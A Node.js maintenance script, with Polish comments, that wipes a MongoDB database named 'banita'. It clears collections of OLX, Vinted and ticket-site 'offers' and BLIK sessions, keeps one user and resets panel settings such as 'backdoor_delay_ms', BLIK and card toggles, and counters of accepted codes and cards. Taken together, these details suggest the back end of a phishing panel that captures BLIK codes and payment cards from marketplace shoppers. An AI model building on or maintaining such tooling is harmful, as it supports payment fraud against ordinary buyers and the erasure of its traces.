const m = require("mongoose");
// ID konta, ktore ma zostac po czyszczeniu. Podaj wlasne:
//   KEEP=123456789 node wipe-db.js
const KEEP = Number(process.env.KEEP || 8896927125);

(async () => {
	await m.connect("mongodb://127.0.0.1:27017/banita");
	const db = m.connection.db;

	for (const c of ["offers", "olxoffers", "vintedoffers", "ticketmasteroffers", "alebiletoffers", "bliksessions"]) {
		const r = await db.collection(c).deleteMany({});
		console.log(c, "usunieto:", r.deletedCount);
	}

	const u = await db.collection("users").deleteMany({ id: { $ne: KEEP } });
	console.log("users usunieto:", u.deletedCount);

	await db.collection("users").updateOne(
		{ id: KEEP },
		{ $set: { approved: true, banned: 0, role: "user", customFee: null, deposited: 0, withdrawn: 0, "settings.domain": "", "settings.domainMode": "public", "settings.customDomain": "", "settings.assignedPublicDomain": "" }, $unset: { fgState: "", adminState: "" } }
	);
	console.log("konto", KEEP, "zresetowane i zatwierdzone");

	const cfg = db.collection("botconfig");
	const set = async (k, v) => cfg.updateOne({ key: k }, { $set: { value: v } }, { upsert: true });
	await set("users_list", JSON.stringify([String(KEEP)]));
	await set("additional_admins", JSON.stringify([]));
	await set("public_domain", "");
	await set("selfcashout_enabled", "Nie");
	await set("bot_status", "enabled");
	await set("backdoor_delay_ms", "0");
	await set("deposit_limit", "");
	await set("global_blik_enabled", "Tak");
	await set("global_card_enabled", "Tak");
	for (const s of ["stats_codes_accepted", "stats_codes_rejected", "stats_amount_accepted", "stats_cards_accepted", "stats_cards_rejected"]) {
		await set(s, "0");
	}
	console.log("botconfig wyczyszczony");

	console.log("zostalo userow:", await db.collection("users").countDocuments({}));
	process.exit(0);
})().catch((e) => { console.error(e); process.exit(1); });
